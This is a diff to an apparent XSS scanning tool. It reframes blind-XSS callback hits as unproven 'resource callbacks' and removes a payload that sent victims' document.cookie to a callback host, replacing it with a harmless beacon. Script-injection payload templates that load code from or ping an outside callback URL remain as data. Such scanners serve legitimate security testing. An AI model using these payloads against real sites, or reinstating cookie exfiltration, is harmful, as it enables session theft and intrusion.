@@ -437,11 +437,8 @@ def _waf_mutations(base_canary, marker):
 BLIND_CALLBACK = ""       # populated by --blind-callback URL
 BLIND_WAIT_SECONDS = 0.0  # populated by --blind-wait N; 0 disables polling
 
-# Phase 3.3: severity tier for confirmed blind XSS. Top of the chain,
-# alongside `proven-executable` from Phase 2.3.
-#   attr-only -> breakout-req -> executable -> proven-executable
-#                                              proven-blind        (blind branch)
-PROVEN_BLIND = "proven-blind"
+# A callback records a resource request; it does not establish JS execution.
+RESOURCE_CALLBACK = "resource-callback"
 
 BLIND_VARIANTS = {
     # (canary_template, marker) - marker is what immediately follows
@@ -465,11 +462,9 @@ BLIND_VARIANTS = {
         '"><script src={CALLBACK}/c/{CID}.js></script>',
         '.js></script>',
     ),
-    # Cookie exfiltration via fetch. When the payload lands in an
-    # authenticated victim's session, document.cookie carries the
-    # session token; POST body preview captures it.
+    # Harmless fetch beacon. Proof collection does not need session secrets.
     "blind-fetch": (
-        '"><script>fetch("{CALLBACK}/c/{CID}",{method:"POST",body:document.cookie})</script>',
+        '"><script>fetch("{CALLBACK}/c/{CID}",{method:"POST",body:"{CID}"})</script>',
         '",{method:',
     ),
     # <svg onload=...> ping. Bypasses many "block <img> beacons" WAFs
@@ -1136,6 +1131,7 @@ def _finding(where, method, param, v, status, context="unknown", canary_id=None,
             "context": ctx, "severity": sev,
             "canary_id": canary_id, "content_type": content_type,
             "variant": variant,
+            "evidence_level": "reflection",
             # Phase 3.3 schema fields - populated by upgrade_finding_with_blind_hit
             "blind_callback_hit": False,
             "hit_at": None,
@@ -1146,7 +1142,7 @@ def _finding(where, method, param, v, status, context="unknown", canary_id=None,
 
 def correlate_blind_findings(findings, timeout=None):
     """Walk `findings`, poll the callback server for every blind-variant
-    finding, upgrade to `proven-blind` on hit. Returns (upgraded_count,
+    finding, record `resource-callback` on hit. Returns (matched_count,
     findings) - the list is mutated in place and also returned for
     fluent chaining.
 
@@ -1172,23 +1168,21 @@ def correlate_blind_findings(findings, timeout=None):
 
 
 def upgrade_finding_with_blind_hit(finding, hit):
-    """Phase 3.3: mutate a finding in-place when a matching callback hit
-    is recorded. Sets severity to `proven-blind` (top of the chain) and
-    fills the blind-hit metadata (UA, IP, Referer, timestamp) so the
-    HTML report can render provenance.
+    """Record a matching resource callback, without claiming execution.
 
-    A None hit is a no-op. A hit whose cid doesn't match the finding's
-    canary_id is a no-op - defence against misuse; the caller shouldn't
-    hand us a mismatched pair.
-
-    Returns True if the upgrade happened, False otherwise, so callers
-    can count how many findings were promoted."""
+    Both identifiers must be non-empty strings and match exactly. Request
+    headers and HTTP method do not authenticate a browser, victim or JS
+    execution. The legacy function name is retained for callers.
+    """
     if not hit or not finding:
         return False
-    if hit.get("cid") and finding.get("canary_id") \
-            and hit["cid"] != finding["canary_id"]:
+    cid = finding.get("canary_id")
+    hit_cid = hit.get("cid")
+    if not isinstance(cid, str) or not cid.strip() \
+            or not isinstance(hit_cid, str) or hit_cid != cid:
         return False
-    finding["severity"] = PROVEN_BLIND
+    finding["severity"] = RESOURCE_CALLBACK
+    finding["evidence_level"] = RESOURCE_CALLBACK
     finding["blind_callback_hit"] = True
     finding["hit_at"] = hit.get("ts")
     finding["hit_from_ua"] = hit.get("user_agent")
@@ -1657,9 +1651,8 @@ def probe_headers(url, header_names, variants=None, waf_bypass=False):
 def _render_blind_section(blind_hits, color_hex, esc):
     """Phase 3.3: dedicated 'blind hits' block in the HTML report.
     Shown only when at least one finding has blind_callback_hit=True.
-    Each row surfaces the callback provenance (UA, IP, Referer, ts) so
-    the operator can confirm the browser that actually fetched the
-    payload was a real victim - not their own scan traffic."""
+    Request metadata supports investigation but does not establish
+    JavaScript execution or the identity of a browser session."""
     def _ts(v):
         try:
             return datetime.datetime.fromtimestamp(float(v)).strftime(
@@ -1681,10 +1674,10 @@ def _render_blind_section(blind_hits, color_hex, esc):
     return (
         f"<div class='blind-block'>"
         f"<h2 style='margin:22px 0 6px;font-size:15px;color:{color_hex}'>"
-        f"blind XSS - callback confirmed ({len(blind_hits)})</h2>"
-        f"<div class='sub'>The payload was fetched by a browser that is not "
-        f"this scan run. Every row proves storage + render in someone else's "
-        f"session.</div>"
+        f"Resource callbacks observed ({len(blind_hits)})</h2>"
+        f"<div class='sub'>A matching HTTP request was recorded. This does not "
+        f"establish JavaScript execution, storage, or another user's session. "
+        f"User-Agent, IP and Referer are request metadata, not proof of identity.</div>"
         f"<table style='margin-top:6px'>"
         f"<tr><th>variant</th><th>cid</th><th>hit at</th>"
         f"<th>from ip</th><th>user-agent</th><th>referer</th></tr>"
@@ -1705,9 +1698,7 @@ def render_html(findings, target, mode, meta=None):
              "unencoded": "#f85149", "attr-only": "#d29922",
              "executable": "#f85149", "breakout-req": "#d29922",
              "attr-breakout": "#d29922",
-             # Phase 3.3: proven-blind is the top severity tier, a
-             # darker red to distinguish it from plain `executable`.
-             "proven-blind": "#a40e0e"}
+             "resource-callback": "#58a6ff"}
     total = len(findings)
     execs = sum(1 for f in findings if f.get("severity") == "executable")
     breakout = sum(1 for f in findings if f.get("severity") == "breakout-req")
@@ -1782,9 +1773,9 @@ def render_html(findings, target, mode, meta=None):
  <div class="stat"><div class="n">{total}</div><div class="l">unique candidates</div></div>
  <div class="stat"><div class="n" style="color:{color['executable']}">{execs}</div><div class="l">executable</div></div>
  <div class="stat"><div class="n" style="color:{color['breakout-req']}">{breakout}</div><div class="l">needs breakout</div></div>
- {'<div class="stat"><div class="n" style="color:' + color['proven-blind'] + '">' + str(len(blind_hits)) + '</div><div class="l">blind (proven)</div></div>' if blind_hits else ''}
+ {'<div class="stat"><div class="n" style="color:' + color['resource-callback'] + '">' + str(len(blind_hits)) + '</div><div class="l">resource callbacks</div></div>' if blind_hits else ''}
 </div>
-{_render_blind_section(blind_hits, color['proven-blind'], esc) if blind_hits else ''}
+{_render_blind_section(blind_hits, color['resource-callback'], esc) if blind_hits else ''}
 {"<div class='warn'>EXECUTABLE = a raw &lt;img onerror&gt; payload runs as-is (body/free context). NEEDS-BREAKOUT = the value survives raw but is inside &lt;title&gt; / &lt;script&gt; / an attribute value, so a follow-on payload (e.g. &lt;/title&gt; or a &quot; breakout) is required for real execution.</div>" if findings else ""}
 <table>
  <tr><th>severity</th><th>context</th><th>reflection</th><th>origin</th><th>method</th><th>param</th><th>url</th><th>status</th></tr>
@@ -2243,8 +2234,8 @@ def main():
     ap.add_argument("--blind-wait", metavar="SECONDS", type=float, default=0.0,
                     help="Phase 3.3: after each blind-variant submit, "
                          "poll <blind-callback>/hits/<cid> for up to "
-                         "SECONDS seconds. On a hit, upgrade the finding "
-                         "to `proven-blind` severity and record UA / IP "
+                         "SECONDS seconds. On a hit, record a "
+                         "`resource-callback` observation (not JS proof) and UA / IP "
                          "/ Referer. Default 0 disables scan-time "
                          "correlation (operator runs a deferred query "
                          "instead). Useful values: 5-30s for demo "
@@ -2354,12 +2345,13 @@ def main():
             for hit in sinks[:20]:
                 arg = (hit.get("arg") or "")[:120].replace("\n", " ")
                 print(f"    {hit.get('sink')}: {arg}")
-        # Phase 2.3: report JS-execution dialogs (proof of execution).
-        # An alert/confirm/prompt/beforeunload that fired proves the
-        # page actually ran attacker-controlled JS, not just reflected it.
+        # A bare visit has no scanner-owned injection to correlate with.
+        # Application dialogs are observations, not evidence of XSS.
         dialogs = summary.get("dialogs", [])
         if dialogs:
-            print(f"[dxadom] JS dialogs fired ({len(dialogs)}) [PROVEN-EXECUTABLE]:")
+            print(f"[dxadom] JS dialogs observed ({len(dialogs)}) [OBSERVED-DIALOG]:")
+            print("[dxadom] No scanner-injected canary was verified; "
+                  "these dialogs do not establish XSS.")
             for d in dialogs[:20]:
                 msg = (d.get("message") or "")[:120].replace("\n", " ")
                 print(f"    {d.get('type')}: {msg}")
@@ -2589,13 +2581,13 @@ def main():
 
         # Phase 3.3: scan-time correlation of blind XSS findings. For any
         # finding whose variant is `blind-*`, poll the callback server up
-        # to --blind-wait seconds; a hit promotes the finding to the
-        # `proven-blind` severity tier and adds UA / IP / Referer / ts.
+        # to --blind-wait seconds; a hit records a resource callback
+        # with UA / IP / Referer / ts, without claiming JS execution.
         if BLIND_CALLBACK and BLIND_WAIT_SECONDS > 0:
             n_up, findings = correlate_blind_findings(findings)
             if n_up:
-                print(f"[dxadyn] blind XSS confirmed: {n_up} finding(s) "
-                      f"upgraded to `proven-blind` "
+                print(f"[dxadyn] resource callbacks observed: {n_up} finding(s); "
+                      f"JavaScript execution not established "
                       f"(callback @ {BLIND_CALLBACK})")
 
         if args.html:
